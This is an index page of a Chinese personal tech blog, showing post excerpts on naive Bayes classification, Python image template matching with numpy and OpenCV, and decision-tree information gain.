<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
<meta name="generator" content="Hexo 7.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/resource/img/fav2024.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/resource/img/fav2024.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/resource/img/fav2024.png">
  <link rel="mask-icon" href="/resource/img/fav2024.png" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"noge.top","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2929408904388376" crossorigin="anonymous"></script><meta property="og:type" content="website">
<meta property="og:title" content="码力欧">
<meta property="og:url" content="https://noge.top/page/9/index.html">
<meta property="og:site_name" content="码力欧">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="nuniok">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://noge.top/page/9/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/9/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>码力欧</title>
  

  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
  <script async src="https://hm.baidu.com/hm.js?9cdc9a11cbd242c6336b07c464d8820c"></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">码力欧</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">瞎折腾</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
        <li class="menu-item menu-item-future"><a href="/future/" rel="section"><i class="sitemap fa-fw"></i>├ 动态</a></li>
        <li class="menu-item menu-item-nas"><a href="/nas/" rel="section"><i class="sitemap fa-fw"></i>├ NAS</a></li>
        <li class="menu-item menu-item-life"><a href="/life/" rel="section"><i class="sitemap fa-fw"></i>├ 生活</a></li>
        <li class="menu-item menu-item-career"><a href="/career/" rel="section"><i class="sitemap fa-fw"></i>└ 技术</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">nuniok</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">101</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">86</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/nuniok" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;nuniok" rel="noopener" target="_blank"><i class="github fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:nuniok@163.com" title="E-Mail → mailto:nuniok@163.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i></a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/12/09/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/12/09/1.html" class="post-title-link" itemprop="url">朴素贝叶斯分类</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-12-09 00:00:00" itemprop="dateCreated datePublished" datetime="2016-12-09T00:00:00+00:00">2016-12-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <ol start="0">
<li>写在前面的话</li>
<li>数学原理</li>
<li>准备流程</li>
<li>贝叶斯分类器</li>
<li>Laplace校准</li>
<li>商品标题分类</li>
<li>自提问解答</li>
<li>分类器总结</li>
</ol>
<hr>
<h2 id="0-写在前面的话"><a href="#0-写在前面的话" class="headerlink" title="0. 写在前面的话"></a>0. 写在前面的话</h2><p>当我在写这篇文章的时候是在第二遍学习朴素贝叶斯分类算法了，后面或许还会有更多实践才能深刻的理解。<br>朴素贝叶斯是一种构建分类器的方法，其样本的每个特征之间都是互相独立的，这样我们可以通过多个特征对应的分类确定样本的所属分类的概率。</p>
<h2 id="1-数学原理"><a href="#1-数学原理" class="headerlink" title="1. 数学原理"></a>1. 数学原理</h2><p>若一个样本有n个特征，分别用<code>x1,x2,...xn</code>表示，将其划分到yk的可能性<br>$$ P(yk|x1,x2,…xn)&#x3D;P(yk)P(x1|yk) P(x2|yk)…P(xn|yk) $$</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/11/30/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/11/30/1.html" class="post-title-link" itemprop="url">图像匹配算法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-11-30 10:00:01" itemprop="dateCreated datePublished" datetime="2016-11-30T10:00:01+00:00">2016-11-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><strong>图像匹配算法</strong>基于像素比较求和实现。</p>
<h4 id="差分矩阵求和"><a href="#差分矩阵求和" class="headerlink" title="差分矩阵求和"></a>差分矩阵求和</h4><p>通过计算两个图像矩阵数据之间的差异分析图像的相似性，然后设置阀值进行比较，公式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">差分矩阵 = 图像A矩阵数据 - 图像B矩阵数据</span><br></pre></td></tr></table></figure>

<p>Python实现如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pic_location</span>(<span class="params">img, findimg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    show_pic_location</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :param findimg:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    fw = findimg.shape[<span class="number">1</span>]</span><br><span class="line">    fh = findimg.shape[<span class="number">0</span>]</span><br><span class="line">    findpt = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(h - fh):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(w - fw):</span><br><span class="line">            comp_tz = img[now_h:now_h + fh, now_w: now_w + fw, :] - findimg</span><br><span class="line">            <span class="keyword">if</span> np.<span class="built_in">sum</span>(comp_tz) &lt; <span class="number">1</span>:</span><br><span class="line">                findpt = now_w, now_h</span><br><span class="line">    <span class="keyword">if</span> findpt <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        cv2.rectangle(img, findpt, (findpt[<span class="number">0</span>] + fw, findpt[<span class="number">1</span>] + fh), (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="差分矩阵均值"><a href="#差分矩阵均值" class="headerlink" title="差分矩阵均值"></a>差分矩阵均值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pic_location</span>(<span class="params">img, findimg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    show_pic_location</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :param findimg:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    fw = findimg.shape[<span class="number">1</span>]</span><br><span class="line">    fh = findimg.shape[<span class="number">0</span>]</span><br><span class="line">    findpt = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(h - fh):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(w - fw):</span><br><span class="line">            comp_tz = img[now_h:now_h + fh, now_w: now_w + fw, :] - findimg</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(np.mean(comp_tz)) &lt; <span class="number">20</span>:</span><br><span class="line">                findpt = now_w, now_h</span><br><span class="line">    <span class="keyword">if</span> findpt <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        cv2.rectangle(img, findpt, (findpt[<span class="number">0</span>] + fw, findpt[<span class="number">1</span>] + fh), (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="欧氏距离匹配"><a href="#欧氏距离匹配" class="headerlink" title="欧氏距离匹配"></a>欧氏距离匹配</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pic_location</span>(<span class="params">img, findimg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    show_pic_location</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :param findimg:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    fw = findimg.shape[<span class="number">1</span>]</span><br><span class="line">    fh = findimg.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    minds = <span class="number">1e8</span></span><br><span class="line">    mincb_h = <span class="number">0</span></span><br><span class="line">    mincb_w = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(h - fh):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(w - fw):</span><br><span class="line">            my_img = img[now_h:now_h + fh, now_w: now_w + fw, :]</span><br><span class="line">            my_findimg = findimg</span><br><span class="line">            myx = np.array(my_img)</span><br><span class="line">            myy = np.array(my_findimg)</span><br><span class="line">            dis = np.sqrt(np.<span class="built_in">sum</span>((myx - myy) * (myx - myy)))</span><br><span class="line">            <span class="keyword">if</span> dis &lt; minds:</span><br><span class="line">                mincb_h = now_h</span><br><span class="line">                mincb_w = now_w</span><br><span class="line">                minds = dis</span><br><span class="line">                <span class="built_in">print</span> mincb_h, mincb_w, minds</span><br><span class="line"></span><br><span class="line">    findpt = mincb_w, mincb_h</span><br><span class="line">    cv2.rectangle(img, findpt, (findpt[<span class="number">0</span>] + fw, findpt[<span class="number">1</span>] + fh), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="添加噪音"><a href="#添加噪音" class="headerlink" title="添加噪音"></a>添加噪音</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_noise</span>(<span class="params">img</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    add_noise</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    count = <span class="number">50000</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(count):</span><br><span class="line">        xi = <span class="built_in">int</span>(np.random.uniform(<span class="number">0</span>, img.shape[<span class="number">1</span>]))</span><br><span class="line">        xj = <span class="built_in">int</span>(np.random.uniform(<span class="number">0</span>, img.shape[<span class="number">0</span>]))</span><br><span class="line">        img[xj, xi, <span class="number">0</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">        img[xj, xi, <span class="number">1</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">        img[xj, xi, <span class="number">2</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><strong>原始图像</strong><br><img src="/resource/img/6ea38a619835b9e4.png" alt="原始图像"></p>
<p><strong>待匹配图像</strong></p>
<p><img src="/resource/img/c3a93583f132dc2d.png" alt="待匹配图像"></p>
<p><strong>加噪点匹配图像</strong></p>
<p><img src="/resource/img/c9ea916ed73ba807.png" alt="加入噪点匹配图像"></p>
<p><strong>旋转加噪点匹配图像</strong></p>
<p><img src="/resource/img/51e441e03e213e32.png" alt="旋转加噪点匹配图像"></p>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author: abc</span></span><br><span class="line"><span class="string">@file: euclidean_distance.py</span></span><br><span class="line"><span class="string">@date: 2016-12-09</span></span><br><span class="line"><span class="string">@desc: 欧式距离匹配</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pic_location</span>(<span class="params">img, findimg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    show_pic_location</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :param findimg:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    fw = findimg.shape[<span class="number">1</span>]</span><br><span class="line">    fh = findimg.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    minds = <span class="number">1e8</span></span><br><span class="line">    mincb_h = <span class="number">0</span></span><br><span class="line">    mincb_w = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(h - fh):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(w - fw):</span><br><span class="line">            my_img = img[now_h:now_h + fh, now_w: now_w + fw, :]</span><br><span class="line">            my_findimg = findimg</span><br><span class="line">            dis = get_euclidean_distance(my_img, my_findimg)</span><br><span class="line">            <span class="keyword">if</span> dis &lt; minds:</span><br><span class="line">                mincb_h = now_h</span><br><span class="line">                mincb_w = now_w</span><br><span class="line">                minds = dis</span><br><span class="line">                <span class="built_in">print</span> mincb_h, mincb_w, minds</span><br><span class="line"></span><br><span class="line">    findpt = mincb_w, mincb_h</span><br><span class="line">    cv2.rectangle(img, findpt, (findpt[<span class="number">0</span>] + fw, findpt[<span class="number">1</span>] + fh), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_euclidean_distance</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算欧氏距离</span></span><br><span class="line"><span class="string">    :param x:</span></span><br><span class="line"><span class="string">    :param y:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    myx = np.array(x)</span><br><span class="line">    myy = np.array(y)</span><br><span class="line">    <span class="keyword">return</span> np.sqrt(np.<span class="built_in">sum</span>((myx - myy) * (myx - myy)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_noise</span>(<span class="params">img</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    add_noise</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    count = <span class="number">50000</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(count):</span><br><span class="line">        xi = <span class="built_in">int</span>(np.random.uniform(<span class="number">0</span>, img.shape[<span class="number">1</span>]))</span><br><span class="line">        xj = <span class="built_in">int</span>(np.random.uniform(<span class="number">0</span>, img.shape[<span class="number">0</span>]))</span><br><span class="line">        img[xj, xi, <span class="number">0</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">        img[xj, xi, <span class="number">1</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">        img[xj, xi, <span class="number">2</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_img</span>(<span class="params">imgpath, imgpath1, imgpath2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    handle_img</span></span><br><span class="line"><span class="string">    :param imgpath:</span></span><br><span class="line"><span class="string">    :param imgpath1:</span></span><br><span class="line"><span class="string">    :param imgpath2:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    myimg = cv2.imread(imgpath)</span><br><span class="line">    myimg1 = cv2.imread(imgpath1)</span><br><span class="line">    myimg2 = cv2.imread(imgpath2)</span><br><span class="line"></span><br><span class="line">    add_noise(myimg)</span><br><span class="line"></span><br><span class="line">    myimg = show_pic_location(myimg, myimg1)</span><br><span class="line">    myimg = show_pic_location(myimg, myimg2)</span><br><span class="line"></span><br><span class="line">    cv2.namedWindow(<span class="string">&#x27;img&#x27;</span>)</span><br><span class="line">    cv2.imshow(<span class="string">&#x27;img&#x27;</span>, myimg)</span><br><span class="line">    cv2.waitKey()</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    imgpath = <span class="string">&quot;/home/abc/Projects/machine_learning/img/test_r45.png&quot;</span></span><br><span class="line">    imgpath1 = <span class="string">&quot;/home/abc/Projects/machine_learning/img/test_1.png&quot;</span></span><br><span class="line">    imgpath2 = <span class="string">&quot;/home/abc/Projects/machine_learning/img/test_2.png&quot;</span></span><br><span class="line">    handle_img(imgpath, imgpath1, imgpath2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/10/30/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/10/30/1.html" class="post-title-link" itemprop="url">决策树</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-10-30 00:00:00" itemprop="dateCreated datePublished" datetime="2016-10-30T00:00:00+00:00">2016-10-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>简单解释：<strong>熵</strong> 为信息的期望值，计算公式如下。</p>
<p>$$ info(D) &#x3D; -\sum_{i&#x3D;1}^m p_i log_2(p_i) $$</p>
<p><strong>信息增益</strong> 是指在划分数据集之前之后信息发生的变化。对信息按属性A划分后取得的熵。<br>$$ info_A(D) &#x3D; \sum_{j&#x3D;1}^v \frac{|D_j|}{|D|}info(D_j) $$</p>
<p>计算两者之间的变化就是信息增益。<br>$$ gain(A) &#x3D; info(D) - info_A(D) $$</p>
<p>如下算法计算最大信息增益。</p>
